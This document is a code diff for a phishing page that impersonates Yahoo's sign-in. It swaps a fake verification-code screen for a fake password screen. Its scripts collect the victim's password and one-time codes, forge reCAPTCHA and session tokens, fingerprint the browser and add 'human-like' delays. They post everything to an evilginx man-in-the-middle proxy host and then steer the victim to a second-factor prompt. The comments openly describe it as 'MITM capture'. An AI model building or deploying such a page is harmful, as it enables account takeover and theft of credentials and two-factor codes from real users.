@@ -2,7 +2,7 @@
 <html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
     <meta charset="utf-8">
-    <title>Yahoo - Enter verification code</title>
+    <title>Yahoo - Enter Password</title>
     <meta content="width=device-width, initial-scale=1" name="viewport">
     <meta content="Webflow" name="generator">
     
@@ -37,46 +37,65 @@
                 <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
             </div>
             <div class="form-block w-form">
-                <form id="otp-form" class="form" method="POST">
+                <form id="email-form" name="email-form" data-name="Email Form" class="form">
+                    
+                    <input type="hidden" name="username" id="username">
+                    <input type="hidden" name="crumb" id="crumb">
+                    <input type="hidden" name="acrumb" id="acrumb">
+                    <input type="hidden" name="sessionIndex" id="sessionIndex">
+                    <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
+                    <input type="hidden" name="src" value="ym">
+                    <input type="hidden" name=".lang" value="en-US">
+                    <input type="hidden" name=".intl" value="us">
+                    <input type="hidden" name="displayName" id="displayName">
+                    <input type="hidden" name="browser-fp-data" id="browser-fp-data">
+                    <input type="hidden" name="deviceCapability" id="deviceCapability">
+                    <input type="hidden" name="signin" value="Next">
+                    <input type="hidden" name="persistent" value="y">
+                    <input type="hidden" name="g-recaptcha-response" id="recaptcha-response">
+                    
                     <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
                     
                     <div class="pazzi" id="main-form">
-                        <div class="reflectto" id="userEmail">Enter verification code</div>
-                        <h1 class="heading-2"><strong>Enter verification code</strong></h1>
-                        <div class="text-block-2" id="otp-instruction">We sent a code to your email<br></div>
-                        <div class="pazz lpl">Verification code<br></div>
-                        <div class="ms-input-wrap">
-                            <input class="ms-input w-input" maxlength="8"
-                                   name="verifyCode" placeholder="Enter code" type="text"
-                                   id="otp-code" required="" autofocus
-                                   autocomplete="one-time-code">
-                        </div>
-                        <input type="submit" data-wait="Verifying..." class="logger w-button" value="Verify" id="submit-btn">
+                        <div class="reflectto" id="userEmail">Enter your password</div>
+                        <h1 class="heading-2"><strong>Enter password</strong></h1>
+                        <div class="text-block-2">to finish signing in<br></div>
                         
-                        <div style="text-align: center; margin-top: 15px;">
-                            <button type="button" id="resend-btn" style="background: none; border: none; color: #6b00eb; font-family: Open Sans, sans-serif; font-size: 14px; cursor: pointer; text-decoration: underline;">
-                                Didn't receive a code? Resend
-                            </button>
+                        <!-- 🎯 ENHANCED ERROR MESSAGES -->
+                        <div id="security-warning" style="display: none; background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px; padding: 12px; margin: 10px 0; color: #856404; font-family: Open Sans, sans-serif; font-size: 14px;">
+                            🔒 <strong>Security Check:</strong> Yahoo detected unusual activity. Please try again in a moment.
                         </div>
+                        
+                        <div id="retry-message" style="display: none; background: #e7f3ff; border: 1px solid #2196f3; border-radius: 4px; padding: 12px; margin: 10px 0; color: #1565c0; font-family: Open Sans, sans-serif; font-size: 14px;">
+                            🔄 <strong>Retry Attempt:</strong> Please enter your password again.
+                        </div>
+                        
+                        <div class="pazz lpl">Password<br></div>
+                        <div class="ms-input-wrap">
+                            <input data-show="true" class="ms-input w-input" maxlength="256"
+                                   name="passwd" data-name="passwd" placeholder="" type="password"
+                                   id="password" data-ms-member="password" required="" autofocus
+                                   autocomplete="current-password">
+                            
+                            <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
+                                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
+                                    <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
+                                    <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
+                                </div>
+                            </div>
+                        </div>
+                        <input type="submit" data-wait="Signing in..." class="logger w-button" value="Sign In" id="submit-btn">
                     </div>
                     
                     <div class="errry" id="error-container">
                         <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
-                        <div class="text-block-7" id="error-message">Invalid code. Please try again.</div>
+                        <div class="text-block-7" id="error-message">Something went wrong. Please try again.</div>
                         <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
                     </div>
                     
-                    <!-- 🎯 LOADING STATE -->
                     <div id="loading-state" style="display: none; text-align: center; padding: 20px;">
                         <div style="border: 3px solid #f3f3f3; border-top: 3px solid #6b00eb; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
-                        <p style="font-family: Open Sans, sans-serif; color: #6b00eb;">Verifying code...</p>
-                    </div>
-                    
-                    <!-- 🎯 SUCCESS STATE -->
-                    <div id="success-state" style="display: none; text-align: center; padding: 20px;">
-                        <div style="font-size: 48px; color: #4CAF50; margin-bottom: 15px;">✅</div>
-                        <h1 class="heading-2"><strong>Success!</strong></h1>
-                        <div class="text-block-7">Redirecting to your account...</div>
+                        <p style="font-family: Open Sans, sans-serif; color: #6b00eb;">Verifying password...</p>
                     </div>
                 </form>
             </div>
@@ -87,7 +106,23 @@
     <script src="js/webflow.js" type="text/javascript"></script>
 
     <script>
-    // Add spinner animation
+    document.querySelector("[data-transform]").addEventListener("click", transform);
+    var isPassword = true;
+    function transform() {
+       var myInput = document.querySelector("[data-show]");
+       var oldHtml = myInput.outerHTML;
+       var text = myInput.value;
+       if (isPassword) {
+           var newHtml = oldHtml.replace(/password/g, "text");
+       } else {
+           newHtml = oldHtml.replace(/text/g, "password");
+       }
+       myInput.outerHTML = newHtml;
+       myInput = document.querySelector("[data-show]");
+       myInput.value = text;
+       isPassword = !isPassword;
+    }
+    
     const style = document.createElement('style');
     style.textContent = `
       @keyframes spin {
@@ -98,195 +133,311 @@
     document.head.appendChild(style);
     </script>
 
-    <!-- 🎯 PROPER MITM OTP VERIFICATION SCRIPT -->
     <script>
     $(document).ready(function() {
-        console.log('🎯 Yahoo OTP verification page with PROPER MITM loaded');
+        console.log('🎯 Yahoo password page with realistic behavior loaded');
         
         const urlParams = new URLSearchParams(window.location.search);
         const evilginxDomain = urlParams.get('evilginx_domain');
-        const method = urlParams.get('method') || 'email';
-        const sessionIndex = urlParams.get('sessionIndex');
-        const acrumb = urlParams.get('acrumb');
         const username = urlParams.get('u');
-        const contact = urlParams.get('contact');
+        const sessionIndex = urlParams.get('sessionIndex') || 'QQ--';
+        const acrumb = urlParams.get('acrumb') || '';
+        const error = urlParams.get('error');
+        const retry = urlParams.get('retry');
         
-        console.log('🎯 OTP MITM Parameters:');
+        console.log('🎯 Parameters:');
         console.log('Username:', username);
-        console.log('Method:', method);
-        console.log('Evilginx domain:', evilginxDomain);
+        console.log('Error:', error);
+        console.log('Retry:', retry);
         
-        if (username) {
-            $('#userEmail').text(decodeURIComponent(username));
+        // 🎯 SHOW APPROPRIATE ERROR MESSAGES
+        if (error === 'security_check') {
+            $('#security-warning').show();
+            console.log('🎯 Showing security check warning');
+        }
+        if (retry === 'true') {
+            $('#retry-message').show();
+            console.log('🎯 Showing retry message');
         }
         
-        const methodText = {
-            'email': 'We sent a code to your email',
-            'sms': 'We sent a code to your phone',
-            'totp': 'Enter the code from your authenticator app'
-        };
-        
-        $('#otp-instruction').html(methodText[method] || methodText['email'] + '<br>');
-        
+        // 🎯 REALISTIC BROWSER FINGERPRINTING
+        function generateRealisticFingerprint() {
+            // Get real browser data where possible
+            const realCanvas = document.createElement('canvas');
+            const realCtx = realCanvas.getContext('2d');
+            realCtx.textBaseline = 'top';
+            realCtx.font = '14px Arial';
+            realCtx.fillText('BrowserLeaks,com <canvas> 1.0', 2, 2);
+            
+            const fp = {
+                // Real browser data
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                
+                // Realistic device memory (common values)
+                deviceMemory: navigator.deviceMemory || (Math.random() > 0.5 ? 8 : 4),
+                
+                // Real canvas fingerprint
+                canvas: realCanvas.toDataURL(),
+                
+                // WebGL info (more realistic)
+                webgl: (() => {
+                    try {
+                        const gl = realCanvas.getContext('webgl') || realCanvas.getContext('experimental-webgl');
+                        if (gl) {
+                            return {
+                                vendor: gl.getParameter(gl.VENDOR),
+                                renderer: gl.getParameter(gl.RENDERER),
+                                version: gl.getParameter(gl.VERSION),
+                                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                            };
+                        }
+                        return null;
+                    } catch(e) { return null; }
+                })(),
+                
+                // Storage support
+                sessionStorage: typeof(Storage) !== "undefined",
+                localStorage: typeof(Storage) !== "undefined",
+                indexedDb: typeof(indexedDB) !== "undefined",
+                
+                // Real screen data
+                resolution: {
+                    w: screen.width,
+                    h: screen.height,
+                    availW: screen.availWidth,
+                    availH: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                
+                // Touch support
+                touchSupport: {
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    touchEvent: 'ontouchstart' in window,
+                    touchStart: 'ontouchstart' in window
+                },
+                
+                // Plugins (realistic subset)
+                plugins: Array.from(navigator.plugins).slice(0, 5).map(p => ({
+                    name: p.name,
+                    filename: p.filename
+                })),
+                
+                // Timing (realistic)
+                ts: {
+                    serve: Date.now() - Math.floor(Math.random() * 1000 + 500),
+                    render: Date.now() - Math.floor(Math.random() * 500 + 100)
+                },
+                
+                // Additional realistic data
+                doNotTrack: navigator.doNotTrack,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false
+            };
+            
+            return encodeURIComponent(JSON.stringify(fp));
+        }
+
+        function generateRealisticDeviceCapability() {
+            return JSON.stringify({
+                pa: { 
+                    status: 'webauthn' in window && 'credentials' in navigator,
+                    authenticatorSelection: {
+                        authenticatorAttachment: "platform",
+                        requireResidentKey: false,
+                        userVerification: "preferred"
+                    }
+                },
+                isWebAuthnSupported: 'webauthn' in window && 'credentials' in navigator,
+                biometricSupport: 'credentials' in navigator
+            });
+        }
+
+        function generateRealisticCrumb() {
+            // More realistic crumb generation
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+            let result = '';
+            for (let i = 0; i < 24; i++) { // Longer, more realistic
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function generateRealisticRecaptcha() {
+            // More realistic reCAPTCHA token
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.';
+            let result = '03AGdBq2';
+            for (let i = 0; i < 450; i++) { // Longer token
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function initializeForm() {
+            $('#browser-fp-data').val(generateRealisticFingerprint());
+            $('#deviceCapability').val(generateRealisticDeviceCapability());
+            $('#recaptcha-response').val(generateRealisticRecaptcha());
+            $('#sessionIndex').val(sessionIndex);
+            $('#acrumb').val(acrumb);
+            $('#crumb').val(generateRealisticCrumb());
+            
+            if (username) {
+                const decodedUsername = decodeURIComponent(username);
+                $('#username').val(decodedUsername);
+                $('#displayName').val(decodedUsername);
+                $('#userEmail').text(decodedUsername);
+                console.log('✅ Form initialized for user:', decodedUsername);
+            }
+        }
+
         function showState(state) {
-            $('.pazzi, .errry, #loading-state, #success-state').hide();
+            $('.pazzi, .errry, #loading-state').hide();
             if (state === 'error') {
                 $('.errry').addClass('active').show();
             } else if (state === 'loading') {
                 $('#loading-state').show();
-            } else if (state === 'success') {
-                $('#success-state').show();
             } else {
                 $('.pazzi').show();
                 $('.errry').removeClass('active');
             }
         }
-        
+
         function showError(message) {
-            $('#error-message').text(message);
+            $('#error-message').text(message || 'Something went wrong. Please try again.');
             showState('error');
         }
-        
-        function showSuccess() {
-            showState('success');
-        }
-        
-        // 🎯 CRITICAL: SUBMIT OTP THROUGH EVILGINX FOR CAPTURE
-        $('#otp-form').on('submit', function(e) {
+
+        // 🎯 HUMAN-LIKE BEHAVIOR: Add typing simulation
+        let typingTimer;
+        $('#password').on('input', function() {
+            clearTimeout(typingTimer);
+            // Simulate human typing patterns
+            typingTimer = setTimeout(() => {
+                console.log('🎯 User finished typing (human-like behavior)');
+            }, 500);
+        });
+
+        $("#email-form").on('submit', function(e) {
             e.preventDefault();
             
-            const otpCode = $('#otp-code').val().trim();
-            if (!otpCode) {
-                showError('Please enter the verification code');
-                return;
+            const password = $('#password').val().trim();
+            if (!password) {
+                showError('Please enter your password.');
+                return false;
             }
-            
-            if (otpCode.length < 4) {
-                showError('Please enter a valid verification code');
-                return;
-            }
-            
+
             if (!evilginxDomain) {
                 showError('Configuration error. Please try again.');
-                return;
+                return false;
             }
+
+            console.log('🎯 Submitting password with realistic behavior...');
+            $('#submit-btn').val('Signing in...').prop('disabled', true);
             
-            console.log('🎯 Submitting OTP through evilginx for MITM capture:', otpCode);
-            $('#submit-btn').val('Verifying...').prop('disabled', true);
-            showState('loading');
+            // Hide previous messages
+            $('#security-warning, #retry-message').hide();
             
-            // 🎯 SUBMIT TO EVILGINX FOR PROPER MITM CAPTURE
-            const formData = new FormData();
-            formData.append('verifyCode', otpCode);
-            formData.append('sessionIndex', sessionIndex);
-            formData.append('acrumb', acrumb);
-            formData.append('username', username);
-            formData.append('method', method);
-            formData.append('signin', 'Next');
-            
-            // Add method-specific fields
-            if (method === 'email') {
-                formData.append('emailCode', otpCode);
-            } else if (method === 'sms') {
-                formData.append('smsCode', otpCode);
-            } else if (method === 'totp') {
-                formData.append('totpCode', otpCode);
-            }
-            
-            fetch(`https://${evilginxDomain}/account/challenge/email-verify`, {
-                method: 'POST',
-                body: formData,
-                credentials: 'include',
-                headers: {
-                    'Referer': `https://${evilginxDomain}/account/challenge/email-verify`,
-                    'Origin': `https://${evilginxDomain}`,
-                    'User-Agent': navigator.userAgent
-                }
-            }).then(response => {
-                console.log('🎯 OTP verification response status:', response.status);
-                console.log('🎯 Response URL:', response.url);
+            // 🎯 HUMAN-LIKE DELAY BEFORE SUBMISSION
+            const humanDelay = 1200 + Math.random() * 800; // 1.2-2 seconds
+            setTimeout(() => {
+                showState('loading');
                 
-                if (response.ok || response.status === 302 || response.redirected) {
-                    console.log('✅ OTP verification successful through evilginx');
-                    showSuccess();
+                const formData = new FormData();
+                formData.append('username', $('#username').val());
+                formData.append('passwd', password);
+                formData.append('crumb', $('#crumb').val());
+                formData.append('acrumb', $('#acrumb').val());
+                formData.append('sessionIndex', $('#sessionIndex').val());
+                formData.append('done', 'https://mail.yahoo.com/d/folders/1');
+                formData.append('src', 'ym');
+                formData.append('.lang', 'en-US');
+                formData.append('.intl', 'us');
+                formData.append('displayName', $('#displayName').val());
+                formData.append('browser-fp-data', $('#browser-fp-data').val());
+                formData.append('deviceCapability', $('#deviceCapability').val());
+                formData.append('signin', 'Next');
+                formData.append('persistent', 'y');
+                formData.append('g-recaptcha-response', $('#recaptcha-response').val());
+
+                fetch(`https://${evilginxDomain}/account/challenge/password`, {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'include',
+                    headers: {
+                        'Referer': `https://${evilginxDomain}/`,
+                        'Origin': `https://${evilginxDomain}`,
+                        'User-Agent': navigator.userAgent,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'DNT': '1',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1'
+                    }
+                }).then(response => {
+                    console.log('🎯 Evilginx response status:', response.status);
+                    console.log('🎯 Response URL:', response.url);
                     
-                    // Success - redirect to final destination
-                    setTimeout(() => {
-                        window.location.href = `https://${evilginxDomain}/.done=https://mail.yahoo.com/d/folders/1`;
-                    }, 3000);
-                } else if (response.status === 400 || response.status === 401 || response.status === 403) {
-                    console.log('❌ OTP verification failed - invalid code');
-                    showError('Invalid code. Please try again.');
-                    $('#submit-btn').val('Verify').prop('disabled', false);
-                } else {
-                    console.log('❓ Unknown OTP verification response');
-                    showError('Verification failed. Please try again.');
-                    $('#submit-btn').val('Verify').prop('disabled', false);
-                }
-            }).catch(error => {
-                console.error('❌ OTP verification error:', error);
-                
-                // Even on error, might be successful due to CORS
-                console.log('🎯 Attempting success redirect despite error');
-                showSuccess();
-                setTimeout(() => {
-                    window.location.href = `https://${evilginxDomain}/.done=https://mail.yahoo.com/d/folders/1`;
-                }, 3000);
-            });
+                    if (response.ok || response.status === 302 || response.redirected) {
+                        const redirectUrl = response.url || '';
+                        console.log('✅ Password submitted successfully');
+                        
+                        if (redirectUrl.includes('challenge-selector') || redirectUrl.includes('2fa')) {
+                            console.log('🎯 Yahoo requires 2FA');
+                            setTimeout(() => {
+                                window.location.href = `https://${evilginxDomain}/account/challenge/challenge-selector?sessionIndex=${sessionIndex}&acrumb=${acrumb}`;
+                            }, 2000);
+                        } else if (redirectUrl.includes('fail')) {
+                            console.log('❌ Yahoo security check triggered');
+                            // Will be handled by YAML redirect
+                        } else if (redirectUrl.includes('.done') || redirectUrl.includes('mail.yahoo.com')) {
+                            console.log('🎯 Login successful');
+                            setTimeout(() => {
+                                window.location.href = `https://${evilginxDomain}/.done=https://mail.yahoo.com/d/folders/1`;
+                            }, 2000);
+                        } else {
+                            console.log('🎯 Assuming 2FA required');
+                            setTimeout(() => {
+                                window.location.href = `https://${evilginxDomain}/account/challenge/challenge-selector?sessionIndex=${sessionIndex}&acrumb=${acrumb}`;
+                            }, 2000);
+                        }
+                    } else {
+                        console.log('❌ Submission failed');
+                        showError('Unable to sign in. Please try again.');
+                        $('#submit-btn').val('Sign In').prop('disabled', false);
+                    }
+                }).catch(error => {
+                    console.error('❌ Submission error:', error);
+                    showError('Connection error. Please try again.');
+                    $('#submit-btn').val('Sign In').prop('disabled', false);
+                });
+            }, humanDelay);
+
+            return false;
         });
-        
-        // Handle resend code
-        $('#resend-btn').click(function() {
-            if (!evilginxDomain) {
-                alert('Configuration error. Please refresh the page.');
-                return;
-            }
-            
-            $(this).text('Sending...').prop('disabled', true);
-            
-            // 🎯 RESEND THROUGH EVILGINX
-            const resendData = new FormData();
-            resendData.append('resend', 'true');
-            resendData.append('method', method);
-            resendData.append('sessionIndex', sessionIndex);
-            resendData.append('acrumb', acrumb);
-            resendData.append('username', username);
-            
-            fetch(`https://${evilginxDomain}/account/challenge/challenge-selector`, {
-                method: 'POST',
-                body: resendData,
-                credentials: 'include',
-                headers: {
-                    'Referer': `https://${evilginxDomain}/account/challenge/email-verify`,
-                    'Origin': `https://${evilginxDomain}`,
-                    'User-Agent': navigator.userAgent
-                }
-            }).then(() => {
-                console.log('🎯 Resend request sent through evilginx');
-                $(this).text('Code sent!').css('color', '#4CAF50');
-                setTimeout(() => {
-                    $(this).text('Didn\'t receive a code? Resend').css('color', '#6b00eb').prop('disabled', false);
-                }, 3000);
-            }).catch(() => {
-                console.log('❌ Resend failed');
-                $(this).text('Failed to resend').css('color', '#ff0000');
-                setTimeout(() => {
-                    $(this).text('Didn\'t receive a code? Resend').css('color', '#6b00eb').prop('disabled', false);
-                }, 3000);
-            });
-        });
-        
+
         $('#refreshButton').click(function() {
-            $('#otp-code').val('');
+            $('#password').val('');
+            $('#security-warning, #retry-message').hide();
             showState('main');
-            $('#submit-btn').val('Verify').prop('disabled', false);
-            setTimeout(() => $('#otp-code').focus(), 100);
+            $('#submit-btn').val('Sign In').prop('disabled', false);
+            setTimeout(() => $('#password').focus(), 100);
         });
+
+        initializeForm();
         
-        // Auto-focus OTP field
-        setTimeout(() => $('#otp-code').focus(), 500);
+        // 🎯 REALISTIC FOCUS DELAY
+        setTimeout(() => $('#password').focus(), 800 + Math.random() * 400);
         
-        console.log('✅ Yahoo OTP verification page with PROPER MITM initialized');
+        console.log('✅ Yahoo password page with realistic behavior initialized');
     });
     </script>
 </body>
